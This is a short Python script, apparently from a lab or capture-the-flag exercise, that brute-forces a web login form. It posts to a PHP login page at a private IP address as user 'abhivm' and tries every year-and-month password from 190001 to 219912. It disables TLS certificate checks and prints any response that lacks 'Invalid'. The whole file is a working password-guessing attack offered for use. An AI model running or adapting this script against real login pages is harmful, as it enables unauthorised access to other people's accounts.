import requests

s = requests.Session()

month = ['01','02','03','04','05','06','07','08','09','10','11','12']
year = 1000
count = 0
for year in range(1900, 2200):
    for i in month:
        password = str(year) + i
        r = s.post("https://172.27.21.91:5001/index.php",
        			{'login':'abhivm', 'password':password, 'secret':'secret'}, verify=False)
        print "--------------------------"
        if 'Invalid' not in r.text:
            print password
            print r.text
        print "--------------------------"
